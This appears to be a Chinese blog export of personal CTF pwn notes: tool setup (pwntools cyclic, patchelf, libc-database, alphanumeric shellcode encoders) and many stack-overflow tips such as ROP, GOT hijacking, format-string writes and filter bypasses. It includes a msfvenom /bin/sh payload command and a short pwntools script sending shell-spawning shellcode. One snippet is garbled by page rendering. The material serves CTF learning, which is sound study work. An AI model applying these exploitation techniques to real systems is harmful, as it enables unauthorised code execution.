<p>在我们完成栈溢出题目的时候，使用pattern可以大大的减少计算溢出点的时间。 </p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">用法：<br>cyclic(<span class="hljs-number">0</span>x100) <span class="hljs-meta"># 生成一个0x100大小的pattern，即一个特殊的字符串</span><br>cyclic_find(<span class="hljs-number">0</span>x61616161) <span class="hljs-meta"># 找到该数据在pattern中的位置</span><br>cyclic_find(&#x27;aaaa&#x27;) <span class="hljs-meta"># 查找位置也可以使用字符串去定位</span><br></code></pre></td></tr></table></figure>

<p>比如，我们在栈溢出的时候，首先构造<code>cyclic(0x100)</code>，或者更长长度的pattern，进行输入，输入后pc的值变为了0x61616161，那么我们通过<code>cyclic_find(0x61616161)</code>就可以得到从哪一个字节开始会控制PC寄存器了，避免了很多没必要的计算。</p>
<p>可以直接在shell中使用cyclic 100</p>
<p>然后查找溢出点 使用 cyclic -l 0x61616161</p>
<p>来源：<a href="https://blog.csdn.net/qq_29343201/article/details/51337025">https://blog.csdn.net/qq_29343201/article/details/51337025</a></p>
<p><strong>转载自：<a href="https://blog.csdn.net/qq_41560595/article/details/114597342">https://blog.csdn.net/qq_41560595/article/details/114597342</a></strong></p>
<p>在做堆实验时，高版本的glibc所含的tcache会对调试产生影响。下面安装不同版本的glibc.<br>下面以安装2.23版本为例：</p>
<h2 id="patchelf-amp-amp-glibc-all-in-one"><a href="#patchelf-amp-amp-glibc-all-in-one" class="headerlink" title="patchelf &amp;&amp; glibc-all-in-one"></a>patchelf &amp;&amp; glibc-all-in-one</h2><p><strong>patchelf</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git clone https://github.com/NixOS/patchelf<br></code></pre></td></tr></table></figure>

<p><strong>glibc-all-in-one</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one<br></code></pre></td></tr></table></figure>

<h3 id="1-安装glibc-all-in-one"><a href="#1-安装glibc-all-in-one" class="headerlink" title="1. 安装glibc-all-in-one"></a>1. 安装glibc-all-in-one</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./update_list             <span class="hljs-comment">#更新最新版本的glibc</span></span><br><span class="hljs-meta">$</span><span class="bash"> cat list                 <span class="hljs-comment">#查看可下载的glibc</span></span><br><span class="hljs-meta">$</span><span class="bash"> ./download 2.23-0ubuntu11.2_amd64        <span class="hljs-comment">#glibc为你想要下载glibc的名字</span></span><br></code></pre></td></tr></table></figure>

<h3 id="2-安装patchelf"><a href="#2-安装patchelf" class="headerlink" title="2. 安装patchelf"></a>2. 安装patchelf</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./bootstrap.sh<br>./configure<br>make<br>sudo make install<br>make check<br></code></pre></td></tr></table></figure>

<p>可能会遇到 <code>autoreconf: not found</code>的报错</p>
<p>安装一下就好</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo apt-get install autoconf automake libtool<br></code></pre></td></tr></table></figure>

<h3 id="3-生成所需的符号链接"><a href="#3-生成所需的符号链接" class="headerlink" title="3.生成所需的符号链接"></a>3.生成所需的符号链接</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"><span class="hljs-built_in">cd</span> /libs  <span class="hljs-comment">#进入libs的目录</span></span>  <br><span class="hljs-meta">$</span><span class="bash"> sudo su    <span class="hljs-comment">#进入root态</span></span><br><span class="hljs-meta">$</span><span class="bash"> ln -s /home/pwn/桌面/tools/glibc-all-in_one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so ./23_11-linux.so.2</span><br><span class="hljs-meta">#</span><span class="bash">./23_11-linux.so.2是自己起的名。23代表glibc版本,11代表ubuntu后面的数字(单纯为了好记)</span><br><span class="hljs-meta">$</span><span class="bash"> ls -l <span class="hljs-comment">#可以看到生成的符号链接</span></span><br></code></pre></td></tr></table></figure>

<p>文件路径要注意修改为自己的路径</p>
<h3 id="4-更改elf文件的ld和libc"><a href="#4-更改elf文件的ld和libc" class="headerlink" title="4.更改elf文件的ld和libc"></a>4.更改elf文件的ld和libc</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> patchelf --set-interpreter /lib64/23_11-linux.so.2 ./chunk_extend_2</span><br><span class="hljs-meta">$</span><span class="bash"> patchelf --replace-needed libc.so.6 /home/pwn/桌面/tools/glibc-all-in_one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so ./chunk_extend_2</span><br><span class="hljs-meta">#</span><span class="bash">libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    chunk_extend_2 是二进制文件</span><br><span class="hljs-meta">$</span><span class="bash"> ldd ./bin <span class="hljs-comment">#查看elf的ld和libc</span></span><br></code></pre></td></tr></table></figure>

<h3 id="我自己调试情况："><a href="#我自己调试情况：" class="headerlink" title="我自己调试情况："></a>我自己调试情况：</h3><p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/QQ%E5%9B%BE%E7%89%8720210418121652.png"></p>
<p>首先，这是还未更换的文件的ld和libc</p>
<p>当输入<code>patchelf --replace-needed libc.so.6 /home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc.so.6 1</code>时</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/QQ%E5%9B%BE%E7%89%8720210418122225.png"></p>
<p>可以发现，libc.so.6的路径被更换了，换为了glibc-all-in-on目录下的libc.so.6，本来按照上面的来讲，总共是要两步的，先是更换链接器，然后改变libc路径。但是我直接去修改libc的路径，得到的结果是跟上述是一样的，已经完成了修改。</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/QQ%E5%9B%BE%E7%89%8720210418122806.png"></p>
<p>去修改链接器，最终指向的仍然是<code>/lib64/ld-linux-x86-64.so.2</code> 并没有在本质上改变了什么</p>
<p>结论为：暂时不知道是因为什么，不过还是建议按上面步骤来</p>
<h2 id="seccomp-tools-工具"><a href="#seccomp-tools-工具" class="headerlink" title="seccomp-tools 工具"></a>seccomp-tools 工具</h2><p>可以<strong>seccomp-tools</strong>这个工具去查看禁用的系统调用</p>
<ul>
<li><p>安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo apt install gcc ruby-dev</span><br><span class="hljs-meta">$</span><span class="bash"> sudo gem install seccomp-tools</span><br></code></pre></td></tr></table></figure></li>
<li><p>使用：一般用到dump这个用法，其他详细用法可见上面github。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">seccomp-tools dump ./xxx<br></code></pre></td></tr></table></figure></li>
</ul>
<h2 id="libc-database"><a href="#libc-database" class="headerlink" title="libc_database"></a>libc_database</h2><p>有一些PWN题故意不给libc文件，但是可以泄露地址，libc database可以利用泄露的地址来确定服务器使用的libc。</p>
<p>先下载libc database</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git clone https://github.com/niklasb/libc-database<br></code></pre></td></tr></table></figure>

<p>利用get来下载流行的libc库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cd libc-database<br>./get ubuntu<br></code></pre></td></tr></table></figure>

<p>程序会自动在ubuntu网站上下载相关的libc文件，存储到./db文件夹下</p>
<p>用法：使用./find可以在db中找到对应libc，如泄露的地址是printf 0xf7xxxx260 puts 0xf7xxxf30，输入最后三位即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./find <span class="hljs-built_in">printf</span> 260 puts f30</span><br></code></pre></td></tr></table></figure>

<h2 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h2><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> pip install z3-solver</span><br></code></pre></td></tr></table></figure>

<p>在python3上安装这个库即可，功能十分强大，可以在python中用这个库解决任何方程（只要有解）</p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>来源：<a href="https://www.jianshu.com/p/64d87659673a">https://www.jianshu.com/p/64d87659673a</a></p>
<p>首先要给所有的变量设置一个类型，他有很多种类型，Int型他代表整数所有的解都只能是整数，当然也可以用Ints一次性设置多个变量</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/webp"><span class="image-caption">img</span></p>
<p>还有就是Real型的这个代表的是有理数，可以解出所有的有理数</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/2"><span class="image-caption">img</span></p>
<p>BitVec(‘a’ , 8)，用来进行位的运算与求解（第二个是指变量的位的个数）</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/3"><span class="image-caption">img</span></p>
<p>首先是给变量赋值，设置一个解方程的类Solver，然后一个一个添加（这样比较直观），check一下看看有没有解，最后得出一个解，当然还有另外一种方法</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/4"><span class="image-caption">img</span></p>
<p>直接用solve函数就可以了</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/5"><span class="image-caption">img</span></p>
<h2 id="纯字符shellcode"><a href="#纯字符shellcode" class="headerlink" title="纯字符shellcode"></a>纯字符shellcode</h2><p>来源：</p>
<p><a href="https://www.codenong.com/cs105236336/">https://www.codenong.com/cs105236336/</a></p>
<p><a href="https://xz.aliyun.com/t/5662#toc-4">https://xz.aliyun.com/t/5662#toc-4</a></p>
<p><a href="https://n0va-scy.github.io/2020/06/21/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/">https://n0va-scy.github.io/2020/06/21/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/</a></p>
<h3 id="可见字符能组成的汇编代码"><a href="#可见字符能组成的汇编代码" class="headerlink" title="可见字符能组成的汇编代码"></a>可见字符能组成的汇编代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">1.数据传送:<br>push/pop eax…<br>pusha/popa<br><br>2.算术运算:<br>inc/dec eax…<br>sub al, 立即数<br>sub byte ptr [eax… + 立即数], al dl…<br>sub byte ptr [eax… + 立即数], ah dh…<br>sub dword ptr [eax… + 立即数], esi edi<br>sub word ptr [eax… + 立即数], si di<br>sub al dl…, byte ptr [eax… + 立即数]<br>sub ah dh…, byte ptr [eax… + 立即数]<br>sub esi edi, dword ptr [eax… + 立即数]<br>sub si di, word ptr [eax… + 立即数]<br><br>3.逻辑运算:<br>and al, 立即数<br>and dword ptr [eax… + 立即数], esi edi<br>and word ptr [eax… + 立即数], si di<br>and ah dh…, byte ptr [ecx edx… + 立即数]<br>and esi edi, dword ptr [eax… + 立即数]<br>and si di, word ptr [eax… + 立即数]<br><br>xor al, 立即数<br>xor byte ptr [eax… + 立即数], al dl…<br>xor byte ptr [eax… + 立即数], ah dh…<br>xor dword ptr [eax… + 立即数], esi edi<br>xor word ptr [eax… + 立即数], si di<br>xor al dl…, byte ptr [eax… + 立即数]<br>xor ah dh…, byte ptr [eax… + 立即数]<br>xor esi edi, dword ptr [eax… + 立即数]<br>xor si di, word ptr [eax… + 立即数]<br><br>4.比较指令:<br>cmp al, 立即数<br>cmp byte ptr [eax… + 立即数], al dl…<br>cmp byte ptr [eax… + 立即数], ah dh…<br>cmp dword ptr [eax… + 立即数], esi edi<br>cmp word ptr [eax… + 立即数], si di<br>cmp al dl…, byte ptr [eax… + 立即数]<br>cmp ah dh…, byte ptr [eax… + 立即数]<br>cmp esi edi, dword ptr [eax… + 立即数]<br>cmp si di, word ptr [eax… + 立即数]<br><br>5.转移指令:<br>push 56h<br>pop eax<br>cmp al, 43h<br>jnz lable<br><br>&lt;=&gt; jmp lable<br><br>6.交换al, ah<br>push eax<br>xor ah, byte ptr [esp] // ah ^= al<br>xor byte ptr [esp], ah // al ^= ah<br>xor ah, byte ptr [esp] // ah ^= al<br>pop eax<br><br>7.清零:<br>push 44h<br>pop eax<br>sub al, 44h ; eax = 0<br><br>push esi<br>push esp<br>pop eax<br>xor [eax], esi ; esi = 0<br></code></pre></td></tr></table></figure>

<h3 id="msf内置的encoder"><a href="#msf内置的encoder" class="headerlink" title="msf内置的encoder"></a>msf内置的encoder</h3><h4 id="一、内置的shellcode"><a href="#一、内置的shellcode" class="headerlink" title="一、内置的shellcode"></a>一、内置的shellcode</h4><p>命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -a x86 --platform linux -p linux/x86/exec CMD=&quot;/bin/sh&quot; -e x86/alpha_upper BufferRegister=eax<br></code></pre></td></tr></table></figure>

<p>BufferRegister指的是指向shellcode的寄存器的值</p>
<h4 id="二、用msf编码自己写的shellcode"><a href="#二、用msf编码自己写的shellcode" class="headerlink" title="二、用msf编码自己写的shellcode"></a>二、用msf编码自己写的shellcode</h4><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat shellcode | msfvenom -a x86 --platform linux -e x86/alpha_upper BufferRegister=eax<br></code></pre></td></tr></table></figure>

<h3 id="alpha3"><a href="#alpha3" class="headerlink" title="alpha3"></a>alpha3</h3><p>修改完之后还需要编译源码，但是编译源码的工具也在google上，如果懒得自己编译，可以直接下载大佬的修改版:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git clone https://github.com/TaQini/alpha3.git<br></code></pre></td></tr></table></figure>

<p>之后输入以下命令：</p>
<p>x64：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;shellcode&quot;<br></code></pre></td></tr></table></figure>

<p>rax是用于编码的寄存器(shellcode基址)，就是在执行shellcode时，借用跳转执行的寄存器，如call rax。就填入rax</p>
<p>x86：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python ./ALPHA3.py x86 ascii mixedcase eax --input=&quot;shellcode_x86&quot;<br>python ./ALPHA3.py x86 ascii lowercase eax --input=&quot;shellcode_x86&quot;<br>python ./ALPHA3.py x86 ascii uppercase eax --input=&quot;shellcode_x86&quot;<br></code></pre></td></tr></table></figure>

<p>mixedcase：数字+大小写字母；lowercase：数字+小写字母；uppercase：数字+大写字母。只有x86才有三种选项</p>
<p>寄存器同上</p>
<h3 id="AE64"><a href="#AE64" class="headerlink" title="AE64"></a>AE64</h3><p>AE64是杭电的一位大师傅写的工具，专用于生成64位的aplha shellcode</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git clone https://github.com/veritas501/ae64.git<br></code></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo python3 -m pip install keystone-engine<br>sudo python3 -m pip install z3-solver<br></code></pre></td></tr></table></figure>

<p>还需要安装以上的两个依赖</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/56"><span class="image-caption">image-20211003154639933</span></p>
<p>如果出现上述情况，执行以下的命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cd ae64<br>sudo cp ./ae64.py /lib/python3/dist-packages/ae64.py<br></code></pre></td></tr></table></figure>

<p>此外AE64是python写的，可以直接在python中调用，以下是例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ae64 <span class="hljs-keyword">import</span> AE64<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;./example1&#x27;</span>)<br><br>shellcode = AE64().encode(asm(shellcraft.sh()),<span class="hljs-string">&#x27;r13&#x27;</span>)<br><br>p.sendline(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>栈溢出--解题二三事</title>
    <url>/2020/11/22/2020-11-22-%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%A7%A3%E9%A2%98%E4%BA%8C%E4%B8%89%E4%BA%8B/</url>
    <content><![CDATA[<p>1、在python中如 \x62，表示一个占一个字节的十六进制数，采用utf-8编码。</p>
<p>2、大多数程序是小端顺序，就是说输入一个数据，如果是分开输入时（比如要一个字节，一个字节的按字节分开进行输入十六进制的数，而他们本身合起来是一个具体的数，那么此时输入进去，就需要把小的值放在前面先写，大的值放后面）；而大端顺序则是大的值写前面，与平常一样的顺序写</p>
<p>因为小端顺序，就是需要从低地址往高地址填充数据，所以先输入的是会放在低地址的数，后输入的才是高地址的数</p>
<p>在Linux中LSB文件为小端顺序，MSB为大端顺序，</p>
<p>3、IDA</p>
<p>（1）F5进行反汇编</p>
<p>（2）ida 中按下F12+SHIFT，可以查看string windows，查看一些关键字符串信息</p>
<p>（3）Alt+b可以进行搜索字符串</p>
<p>（4）在反汇编窗口中，点击函数按下X，可以查看交叉引用</p>
<p>（5）TAB键可以切换汇编与伪代码</p>
<p>（6）**;** 键可以为当前指令添加全文交叉引用的注释 </p>
<p>（7）n可以定义或修改名称，通常用来标注函数名 </p>
<p>（8）g可以跳转到任意地址 </p>
<p>（9）Esc可以返回到跳转前的位置 </p>
<p>（10）D可以分别按字节、字、双字显示数据 </p>
<p>（11）A可以按 ASCII 显示数据 </p>
<p>（12）/为伪C代码添加注释</p>
<p>ida的伪代码含义：</p>
<p>sub_ 指令和子函数起点</p>
<p>locret_ 返回指令 </p>
<p>loc_ 指令</p>
<p>off_ 数据，包含偏移量</p>
<p>seg_ 数据，包含段地址值</p>
<p>asc_ 数据，ASCII字符串</p>
<p>byte_ 数据，字节（或字节数组）</p>
<p>word_ 数据，16位数据（或字数组）</p>
<p>dword_ 数据，32位数据（或双字数组）</p>
<p>qword_ 数据，64位数据（或4字数组）</p>
<p>flt_ 浮点数据，32位（或浮点数组）</p>
<p>dbl_ 浮点数，64位（或双精度数组）</p>
<p>tbyte_ 浮点数，80位（或扩展精度浮点数）</p>
<p>stru_ 结构体(或结构体数组)</p>
<p>algn_ 对齐指示</p>
<p>unk_ 未处理字节</p>
<p>4、利用字符串程序输入溢出数据造成栈溢出的时候不要包含\x00（也就是所谓的空字符’\0’），否则向程序传入溢出数据时会造成截断</p>
<p>5、遇到不确定的地址时而最后地址的末端是我们需要到的shell的起始地址，可以填入\x90，对应的机器码指令是NOP(No Operation)，让CPU什么都不做，跳转到下一条命令，但是这个应用的前提是该处代码具有可执行性</p>
<p>6、在一起定义的两个全局变量，在内存的中位置是相邻的。如果一个全局变量被破坏了，不妨先查查其前后相关变量的访问代码，看看是否存在越界访问的可能。</p>
<p>7、有一个有意思的东西：在有的pwn题目中，我可以很正常的使用recvuntil()或者sendlineafter()去接收字符串，然而有的却不行；有的题目可以不用接收字符串直接输入payload（一开始认为是因为程序是在自己运行，刚好溢出点又在第一次输入的地方，所以可以），然而却碰到有些却要我接收信息才可以进行payload的输入</p>
<p>回复   ：最好是进行交互，之前可能是因为环境有些问题</p>
<p>8、遇到一个对齐的问题：关于使用system函数进行跳转出现报错的原因</p>
<p>回复：system获得shell，是要求有栈对齐的</p>
<p>9、劫持栈帧到.bss段上时，要注意一下是否可能会将.got.plt表覆盖，导致程序无法正常执行</p>
<p>10、承接第4点吧，我们避免输入\x00导致程序截断，同时也要注意程序是否自身有着\x00，导致了截断</p>
<p>11、遇到strcat、strcpy、strcmp、strlen等函数的阻碍时，由于这些函数遇到’\0’将会停止，那么只要将其中的某个变量的第一个字符设为’\0’即可快速简单的绕过这些函数</p>
<p>12、当用puts函数泄露got表的地址，使用u64解包时，由于u64解包的条件是需要字符串的长度为8个字节，而地址的长度顶多6个字节那么长（高地址填充0，但是我们并不能接收到），此时就需要使用这样的形式进行接收：<strong>u64(p.recv(6).ljust(8,’\0’))</strong>  （’\0’写成’\x00’也行，毕竟在内存中存储情况是一样的还有**u64(p.recvuntil(‘\x7f’).ljust(8,’\x00’))**）</p>
<p>13、一个大多数人应该都有错误的认知：认为溢出只要到如gets函数就能实现溢出了，所以下面的代码就不用看，这是绝对错误的！首先，我们通过栈溢出改变的只是返回地址的内容，想要到达返回地址，整个的函数执行流必须进行完，才会发生退栈，从而利用返回地址，所以下方的代码也要处理</p>
<p>14、执行strcmp、strncmp、strcasecmp的时候，rdx会被设置为将要被比较的字符串的长度</p>
<p>15、system的参数不一定是要/bin/sh才可以，只有sh也是可以的。而且sh可以从fflush()这个函数中获取，直接查找ida或者ROPgadget –binary 文件名 –string ‘sh’查询（不一定都能成功）</p>
<p>有时候system参数会出现截断问题，写成<code>;sh\x00</code>，<code>||sh</code>，<code>&amp;&amp;sh</code></p>
<p>16、当远程docker过滤空格和cat时，将无法使用cat flag获取到flag，此时我们可以用<strong>more&lt;flag或者base64&lt;flag</strong>获取flag，其中的&lt;可以代替空格的功能，第一个<strong>more&lt;flag</strong> 与cat一样都是输出文件内容，而base64是把flag的内容转换成base64编码</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tacMATHJAX</span>-SSR-<span class="hljs-number">09</span>flag<br></code></pre></td></tr></table></figure>

<p>&lt;、&lt;&gt;可以代替空格</p>
<p>17、64位的文件有时候不一定会存在rbp的调用，不存在leave指令，这时候我们只需要去关注rsp的位置即可，因为ret指令代表着pop rip，把栈顶的内容弹出给rip，所以锁定rsp的位置，就可以劫持rip</p>
<p>18、有时候在我们输入时，无法通过recvuntil去卡到输入的点，可以使用sleep()函数，让线程休眠，让对面的程序跑到我们要到点，再进行输入，方可利用成功（个人猜测）</p>
<p>19、64位下的linux的系统调用号（使用syscall调用，调用号是保存到rax中,函数传参依次存入RDI,RSI,RDX,RCX,R8,R9）</p>
<p><strong>0(0x0) sys_read</strong></p>
<p><strong>1(0x1) sys_write</strong></p>
<p><strong>2(0x2)sys_open</strong></p>
<p><strong>3(0x3)sys_close</strong></p>
<p><strong>9(0x9)sys_mmap</strong></p>
<p><strong>15(0xF) sys_rt_sigreturn</strong></p>
<p><strong>37(0x25)sys_alarm</strong></p>
<p><strong>59(0x3B) sys_execve</strong></p>
<p><strong>60(0x3C)sys_exit</strong></p>
<p><strong>62(0x3E)sys_kill</strong></p>
<p>32位下linux系统调用号（使用int 80h，调用号保存在eax中，执行完函数的返回值也保存在eax里面），函数其他参数依次存入ebx，ecx，edx中</p>
<p><strong>1(0x1)sys_exit</strong></p>
<p><strong>3(0x3)sys_read</strong></p>
<p><strong>4(0x4)sys_write</strong></p>
<p><strong>5(0x5)sys_open(文件名,0,0)</strong></p>
<p><strong>11(0xB) sys_execve</strong> </p>
<p>20、使用<strong>execve</strong>获取shell时，其参数要设置为<code>execve(&quot;/bin/sh&quot;,0,0)</code></p>
<p>21、劫持rip时，如果觉得在ida中的栈查看覆盖偏移量是对的，却没能获取shell时，去看看汇编代码，可能这时候出题人故意设置了返回代码不是平常的 leave  ret这两个，被修改为其他的代码了，导致退栈时候rsp指向地方的不是在rbp的下面，这时候我们要去gdb里面下断点在返回的指令前，查看rbp具体指向的地方</p>
<p>22、<strong>gdb 文件名 core</strong>可以调试程序中断而生成的核心转储文件，进行深入查看中断原因 </p>
<p>23、当题目已给出libc时，可以直接用libc显示出函数在其内的偏移地址，命令格式如下：（也可以直接调用libc文件，libc = ELF(“./文件名”)）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">objdump -T ./libc-2.23.so | grep system #显示system的libc地址<br></code></pre></td></tr></table></figure>

<p><img src="/2020/11/22/2020-11-22-%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%A7%A3%E9%A2%98%E4%BA%8C%E4%B8%89%E4%BA%8B/QQ%E5%9B%BE%E7%89%8720210510214657.png"></p>
<p>24、静态链接题目多半考虑ret2syscall，或者看有没有mprotect函数，修改段的执行权限，注入shellcode</p>
<p>25、libc中environ存储了栈上环境变量的特性，可以利用这个特效来泄露出栈上的地址，写为这样libc.sym[“environ”]</p>
<p>26、scanf读取过长的输入时会使用malloc_hook分配chunk，也就是如果能修改__malloc_hook为one_gadget的话，就能getshell</p>
<p>27、got表劫持：常见劫持put(buf)、free(buf)、atoi(buf)、atol(buf)、strlen(buf)</p>
<p>28、当scanf的参数不是%s时候，是u，d等数字，输入数字是使用str()即可，不用p64()。</p>
<p>因为输入数字是就是使用数字输入，如果使用了p64()将会变成字符数字</p>
<p>29、使用execv(“/bin/sh”,0)getshell需要两个参数,比execve少一个</p>
<p>另外：2.29之后的libc直接调用system可能会出问题，但是劫持__free_hook为system没问题</p>
<p>30、碰到静态编译的题目时，有两种方法：</p>
<ul>
<li><p>使用ROPgadget内置的功能，可以自动生成rop链，调用系统函数getshell，命令：</p>
<p><code>ROPgadget --binary 文件名 --ropchain</code></p>
</li>
<li><p>使用mprotect函数修改.bss段执行权限，把shellcode写入.bss段中执行而getshell</p>
</li>
</ul>
<p>31、格式化字符串漏洞：当要往某个地址上写入地址时，格式为：目标addr + ‘%’ + str(addr - 已写的长度) + “c%a(a是偏移量)$hn” 这边一般使用hn写两个字节，或者hhn写一个字节，这样不容易造成timeout，当然前提是格式化漏洞给的长度够长</p>
<p>已写长度：printf打印出来的字符长度，地址数值大的写后面（就能直接减去前面已经写的偏移量）</p>
<p>64位，因为地址必定含有’\x00’，会产生截断，所以往目标地址写入值，要把地址放在最后面，不然打印的字符被截断，n就没办法发生作用                                                                                                                                                                            </p>
<p>32、对于劫持rip的理解：首先我们传递给rip的是某个地址，其次这个地址指向的是一段有可执行权限的地址，最后这个地址上存在着指令（机器码）rop就是还需要ret来衔接进行不断地更换rip的值</p>
<p>33、linux中，程序在加载的时候，会依次调用<code>init.array</code>数组中的每一个函数指针；在结束的时候，依次调用<code>fini.array</code>中的每一个函数指针。一般用在当程序出现格式化字符串漏洞，但是至少需要写两次才能完成攻击。</p>
<ul>
<li>可以考虑改写<code>fini.array</code>中的函数指针为<code>main</code>函数地址，可以再执行一次<code>main</code>函数。（或者在格式化字符串漏洞后面存在有其他函数的调用，也可以考虑修改这个函数的got表）</li>
<li>一般来说，这个数组的长度为1，也就是说只能写一个地址</li>
</ul>
<p>获取fini.array地址有两种方式：1、<code>fini_array = elf.sym[&quot;__init_array_end&quot;]</code>   2、使用<code>readelf -s 文件名</code>命令去查找<code>__init_array_end</code>的地址</p>
<p>34、如果把0x80000000赋值给a，而a = -a，那么a还是等于0x80000000</p>
<p>35、用libc寻找字符串/bin/sh地址，写为binsh = libc_base + next(libc.search(‘/bin/sh’))</p>
<p>36、scanf(buf,buf)，如果是以这样的形式出现输入，因为第一个buf是格式化字符串，scanf使用了我们的输入作为格式化字符串，因此会存在格式化字符串漏洞，计算偏移需要通过gdb调试（必须在相应的版本下调试）</p>
<p>%n$s（n是偏移，s是输入的形式以字符串，所以我们输入的地方是以偏移点作为指针输入的）</p>
<p>37、当程序存在close(1)以及close(2)：代表关闭了linux里面的标准输出(1)和标准错误(2)，所以即使已经getshell了，我们是看不到输出的，所以这时候输入<code>exec 1&gt;&amp;0</code>就可以让标准输出的文件描述符重定向为0，而0没被关闭（0，1，2是默认开启的），才能看到输出</p>
<p>38、glibc版本仅限于libc-2.26及以下：当flag保存在栈上、bss等地方时，可以通过修改栈上main函数的argv[0]（文件路径），改为flag的地址，然后stack check fail会打印环境变量的第一个值，即可打印出flag，高版本增加了限制，不会再打印出文件路径</p>
<p>39、当遇到一些题目需要在shellcode前面加上’\x00’才能绕过时，因为’\x00’是会影响到shellcode解析的，所以要让’\x00’凑成有意义的指令却又不能影响到shellcode（底下的机器码在32位和64位中都是一样的）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">00 40 00                 add    BYTE PTR [rax+0x0],  al<br>00 41 00                 add    BYTE PTR [rcx+0x0],  al<br>00 42 00                 add    BYTE PTR [rdx+0x0],  al<br>00 43 00                 add    BYTE PTR [rbx+0x0],  al<br>00 45 00                 add    BYTE PTR [rbp+0x0],  al<br>00 46 00                 add    BYTE PTR [rsi+0x0],  al<br>00 47 00                 add    BYTE PTR [rdi+0x0],  al<br></code></pre></td></tr></table></figure>

<p>40、栈题的调试一直都不知道怎么才能准确的停止在某个地方，现在终于知道了</p>
